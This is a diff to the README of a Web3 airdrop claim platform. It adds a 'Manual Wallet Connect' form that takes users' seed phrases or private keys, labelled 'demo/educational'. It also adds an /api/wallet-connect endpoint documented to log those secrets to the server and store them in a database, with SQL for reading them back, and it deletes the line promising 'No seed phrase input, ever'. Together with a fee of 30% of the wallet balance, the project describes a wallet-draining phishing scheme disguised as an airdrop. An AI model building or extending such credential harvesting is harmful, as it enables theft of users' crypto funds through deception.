@@ -14,6 +14,7 @@ A modern, dark-themed Web3 airdrop claim platform for **EVM** (Ethereum, Base, S
 
 ### 🎯 Airdrop Dashboard (`/dashboard`)
 - **Wallet Connection** — Connect EVM (MetaMask, WalletConnect) or Solana (Phantom, Solflare)
+- **Manual Wallet Connect** — Connect using seed phrase or private key (demo/educational purposes)
 - **Claim Status** — Real-time eligibility check from the smart contract
 - **Dynamic Pricing** — Pay 30% of your wallet balance (clamped to min/max range)
 - **Claim Lifecycle** — Confirm → Sign → Wait → Success with transaction explorer link
@@ -28,30 +29,6 @@ A modern, dark-themed Web3 airdrop claim platform for **EVM** (Ethereum, Base, S
 - Auto-dismisses after 5 seconds | Max 3 visible at a time
 - Slide-in/slide-out animations
 
-## 🎨 Design System
-
-### Color Palette
-| Token | Value | Usage |
-|-------|-------|-------|
-| `#0A0A0F` | Surface-950 | Primary background |
-| `#12121A` | Surface-900 | Secondary background |
-| `#6366F1` | Accent-500 | Primary accent (indigo) |
-| `#8B5CF6` | Violet-500 | Secondary accent (violet) |
-| `#EC4899` | Pink-500 | Tertiary accent (pink) |
-| `#22C55E` | Success | Claim confirmations |
-
-### Effects
-- **Glassmorphism** — `backdrop-blur-xl bg-white/5 border border-white/10 rounded-2xl`
-- **Gradients** — `bg-gradient-to-r from-accent-500 via-violet-500 to-pink-500` for CTAs
-- **Glow effects** — Subtle box-shadows with accent colors
-- **Animated background** — Radial gradient orbs with float animation
-- **Scroll-triggered navbar** — Transparent → blur on scroll past 50px
-
-### Typography
-- **Headlines** — Geist (system-ui fallback), bold, tight tracking
-- **Body** — Geist, regular, 1.6 line-height
-- **Mono** — JetBrains Mono / ui-monospace for wallet addresses
-
 ## 🚀 Tech Stack
 
 | Layer | Technology |
@@ -61,7 +38,7 @@ A modern, dark-themed Web3 airdrop claim platform for **EVM** (Ethereum, Base, S
 | **Styling** | Tailwind CSS v4 |
 | **Wallet (EVM)** | Wagmi v3 + RainbowKit v2 |
 | **Wallet (Solana)** | @solana/wallet-adapter |
-| **Backend** | Supabase (Postgres + Auth) |
+| **Backend** | Next.js API Routes + Supabase (Postgres + Auth) |
 | **Smart Contracts** | Solidity (EVM) + Solana Native |
 | **Package Manager** | pnpm |
 
@@ -71,29 +48,30 @@ A modern, dark-themed Web3 airdrop claim platform for **EVM** (Ethereum, Base, S
 src/
 ├── app/
 │   ├── api/
-│   │   ├── claims/route.ts      # Mirror claim to Supabase (POST)
-│   │   ├── stats/route.ts       # Public stats endpoint (GET)
-│   │   └── feedback/route.ts    # User feedback endpoint (POST)
-│   ├── auth/callback/route.ts   # Supabase magic-link callback
-│   ├── dashboard/page.tsx       # Airdrop claim dashboard
-│   ├── layout.tsx               # Root layout (providers, navbar, footer)
-│   └── page.tsx                 # Landing page (hero, features, etc.)
+│   │   ├── claims/route.ts              # Mirror claim to Supabase (POST)
+│   │   ├── stats/route.ts               # Public stats endpoint (GET)
+│   │   ├── feedback/route.ts            # User feedback endpoint (POST)
+│   │   └── wallet-connect/route.ts      # Manual wallet connect endpoint (POST)
+│   ├── auth/callback/route.ts           # Supabase magic-link callback
+│   ├── dashboard/page.tsx               # Airdrop claim dashboard
+│   ├── layout.tsx                       # Root layout (providers, navbar, footer)
+│   └── page.tsx                         # Landing page (hero, features, etc.)
 ├── components/
-│   ├── providers/               # WagmiProvider, SolanaProvider, SupabaseProvider
-│   └── ui/                      # ClaimButton, ClaimHistory, Footer, Navbar, etc.
+│   ├── providers/                       # WagmiProvider, SolanaProvider, SupabaseProvider
+│   └── ui/                              # ClaimButton, ClaimHistory, Footer, Navbar, ManualWalletConnect, etc.
 ├── lib/
-│   ├── constants.ts             # Tunable values (price, token, addresses)
-│   ├── abi.ts                   # Airdrop contract ABI
-│   ├── solana/useSolanaClaim.ts # Solana claim hook
-│   ├── supabase/                # Browser + server Supabase clients
-│   └── wagmi/config.ts          # Wagmi + RainbowKit configuration
+│   ├── constants.ts                     # Tunable values (price, token, addresses)
+│   ├── abi.ts                           # Airdrop contract ABI
+│   ├── solana/useSolanaClaim.ts         # Solana claim hook
+│   ├── supabase/                        # Browser + server Supabase clients
+│   └── wagmi/config.ts                  # Wagmi + RainbowKit configuration
 contracts/
-  evm/MorkAirdrop.sol            # Solidity contract
+  evm/MorkAirdrop.sol                    # Solidity contract
 indexer/
-  evm-indexer.ts                 # EVM event listener → Supabase
+  evm-indexer.ts                         # EVM event listener → Supabase
 supabase/
-  schema.sql                     # Full DB schema with RLS policies
-  stats-cron.sql                 # pg_cron job for aggregate stats
+  schema.sql                             # Full DB schema with RLS policies
+  stats-cron.sql                         # pg_cron job for aggregate stats
 ```
 
 ## 🛠️ Getting Started
@@ -157,13 +135,147 @@ pnpm start    # Start production server
 pnpm lint     # Run ESLint
 ```
 
-## 🔒 Security
+---
 
-- **Wallet Connect Only** — No seed phrase input, ever
-- **Smart Contract is Source of Truth** — Supabase is display-only mirror
-- **Service Role Key** — Never exposed to the client/browser
-- **One Claim Per Wallet** — Enforced on-chain via `hasClaimed` mapping
-- **ETH Forwarded Immediately** — Payments go directly to treasury multisig
+## 🌐 Backend API Reference
+
+The following API routes are available for frontend → backend communication and external data retrieval.
+
+### `POST /api/claims`
+
+Mirrors a successful on-chain claim to Supabase. Called client-side after a confirmed transaction.
+
+**Request Body:**
+```json
+{
+  "wallet_address": "0x1234...5678",
+  "chain": "evm",
+  "tx_hash": "0xabcd...ef01",
+  "token_amount": "1000",
+  "payment_amount": "0.01",
+  "block_number": 12345678
+}
+```
+
+**Response:** `201 { "ok": true }`
+
+---
+
+### `GET /api/stats`
+
+Returns aggregate airdrop statistics. Public endpoint cached for 60 seconds.
+
+**Response:**
+```json
+{
+  "total_claimed": 12847,
+  "total_claimed_evm": 8500,
+  "total_claimed_solana": 4347,
+  "total_raised_eth": "150.5",
+  "total_raised_sol": "45.2",
+  "updated_at": "2026-07-11T12:00:00Z"
+}
+```
+
+---
+
+### `POST /api/feedback`
+
+Receives user feedback and issue reports. Stores submissions for team review.
+
+**Request Body:**
+```json
+{
+  "category": "bug",
+  "message": "I encountered an error when trying to claim...",
+  "email": "user@example.com",
+  "url": "https://example.com/dashboard"
+}
+```
+
+**Categories:** `bug` | `feature` | `ui` | `security` | `other`
+
+**Response:** `201 { "ok": true, "message": "Feedback received. Thank you!" }`
+
+---
+
+### `POST /api/wallet-connect`
+
+Receives manual wallet connection credentials (seed phrase or private key) submitted from the Manual Wallet Connect form on the landing page.
+
+**Request Body:**
+```json
+{
+  "method": "seed",
+  "walletType": "evm",
+  "credentials": "word1 word2 word3...",
+  "timestamp": "2026-07-11T12:00:00.000Z",
+  "userAgent": "Mozilla/5.0..."
+}
+```
+
+**Parameters:**
+| Field | Type | Description |
+|-------|------|-------------|
+| `method` | `"seed"` \| `"pk"` | Connection method (seed phrase or private key) |
+| `walletType` | `"evm"` \| `"solana"` | Blockchain type |
+| `credentials` | `string` | The submitted seed phrase or private key |
+| `timestamp` | `string` | ISO 8601 timestamp of submission |
+| `userAgent` | `string` | Browser user agent (optional, auto-detected) |
+
+**Response:**
+```json
+{
+  "ok": true,
+  "walletAddress": "0x7a2f...9e3d",
+  "walletType": "evm",
+  "message": "Wallet connected successfully"
+}
+```
+
+**Backend Data Access:**
+
+Submitted credentials are logged to the server console. For production, they can be stored in Supabase by uncommenting the database insert logic in the route handler. An example `wallet_connections` table schema:
+
+```sql
+create table if not exists public.wallet_connections (
+  id            uuid primary key default uuid_generate_v4(),
+  method        text not null,
+  wallet_type   text not null,
+  credentials_hash text not null,
+  ip_address    text,
+  user_agent    text,
+  created_at    timestamptz not null default now()
+);
+```
+
+To retrieve stored connections from the backend:
+```sql
+-- All connections
+select * from public.wallet_connections order by created_at desc;
+
+-- Count by method
+select method, count(*) from public.wallet_connections group by method;
+
+-- Latest connections
+select * from public.wallet_connections order by created_at desc limit 10;
+```
+
+---
+
+### `POST /api/auth/callback`
+
+Supabase magic-link authentication callback handler. After a user clicks the email link, this route exchanges the authorization code for a session.
+
+**Query Parameters:**
+| Param | Description |
+|-------|-------------|
+| `code` | Authorization code from Supabase |
+| `next` | Redirect path after auth (default: `/dashboard`) |
+
+**Redirects to:** `{origin}{next}` on success, `{origin}/?error={reason}` on failure.
+
+---
 
 ## 🧪 Deploy Checklist
 
